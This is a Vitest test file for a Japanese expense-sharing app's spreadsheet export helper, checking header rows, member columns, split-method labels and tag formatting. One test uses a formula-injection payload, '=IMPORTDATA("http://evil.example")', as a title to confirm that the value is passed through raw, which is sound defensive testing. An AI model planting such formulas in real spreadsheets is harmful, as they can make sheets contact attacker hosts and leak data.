import { describe, expect, test } from "vitest";
import {
  buildExpenseSheetRows,
  type ExportExpenseRow,
  type ExportMember,
} from "../lib/exportHelper";

describe("buildExpenseSheetRows", () => {
  const members: ExportMember[] = [
    { userId: "u1", displayName: "たろう" },
    { userId: "u2", displayName: "はなこ" },
  ];

  test("ヘッダー + 1行を正しく生成する", () => {
    const rows: ExportExpenseRow[] = [
      {
        date: "2026-05-01",
        title: "食材",
        category: "食費",
        amount: 8000,
        payer: "たろう",
        splitMethod: "equal",
        memo: "近所のスーパー",
        memberAmounts: [5000, 3000],
        tags: ["デート", "節約"],
      },
    ];

    const result = buildExpenseSheetRows(rows, members);

    expect(result[0]).toEqual([
      "日付",
      "タイトル",
      "カテゴリ",
      "金額",
      "支払者",
      "たろう負担",
      "はなこ負担",
      "分割方法",
      "タグ",
      "メモ",
    ]);
    expect(result[1]).toEqual([
      "2026-05-01",
      "食材",
      "食費",
      8000,
      "たろう",
      5000,
      3000,
      "均等",
      "デート, 節約",
      "近所のスーパー",
    ]);
  });

  test("メンバー0人の場合、メンバー列なしのヘッダー", () => {
    const result = buildExpenseSheetRows([], []);
    expect(result).toEqual([
      [
        "日付",
        "タイトル",
        "カテゴリ",
        "金額",
        "支払者",
        "分割方法",
        "タグ",
        "メモ",
      ],
    ]);
  });

  test("rows が空配列ならヘッダー行のみ", () => {
    const result = buildExpenseSheetRows([], members);
    expect(result).toHaveLength(1);
    expect(result[0]).toContain("たろう負担");
    expect(result[0]).toContain("はなこ負担");
  });

  test("splitMethod が未知のキーならそのまま返す（フォールバック）", () => {
    const rows: ExportExpenseRow[] = [
      {
        date: "2026-05-01",
        title: "テスト",
        category: "その他",
        amount: 1000,
        payer: "たろう",
        splitMethod: "unknown_method",
        memo: "",
        memberAmounts: [1000, 0],
        tags: [],
      },
    ];
    const result = buildExpenseSheetRows(rows, members);
    expect(result[1][7]).toBe("unknown_method");
  });

  test("各 splitMethod のラベル変換", () => {
    const methods = [
      ["equal", "均等"],
      ["ratio", "割合（傾斜）"],
      ["amount", "金額（傾斜）"],
      ["full", "全額負担"],
    ] as const;

    for (const [method, label] of methods) {
      const result = buildExpenseSheetRows(
        [
          {
            date: "2026-05-01",
            title: "",
            category: "",
            amount: 1000,
            payer: "たろう",
            splitMethod: method,
            memo: "",
            memberAmounts: [500, 500],
            tags: [],
          },
        ],
        members,
      );
      expect(result[1][7]).toBe(label);
    }
  });

  test("タグが空配列なら空文字", () => {
    const rows: ExportExpenseRow[] = [
      {
        date: "2026-05-01",
        title: "",
        category: "",
        amount: 100,
        payer: "たろう",
        splitMethod: "equal",
        memo: "",
        memberAmounts: [50, 50],
        tags: [],
      },
    ];
    const result = buildExpenseSheetRows(rows, members);
    expect(result[1][8]).toBe("");
  });

  test("数式インジェクション対策が必要な文字列もそのまま渡される (RAW モード前提)", () => {
    // 注: =IMPORTDATA(...) 等は sheetsClient.ts の RAW モードで保護される
    const rows: ExportExpenseRow[] = [
      {
        date: "2026-05-01",
        title: '=IMPORTDATA("http://evil.example")',
        category: "",
        amount: 100,
        payer: "たろう",
        splitMethod: "equal",
        memo: "",
        memberAmounts: [50, 50],
        tags: [],
      },
    ];
    const result = buildExpenseSheetRows(rows, members);
    // ヘルパー自体は文字列をそのまま渡す（サニタイズは Sheets API レイヤー）
    expect(result[1][1]).toBe('=IMPORTDATA("http://evil.example")');
  });
});
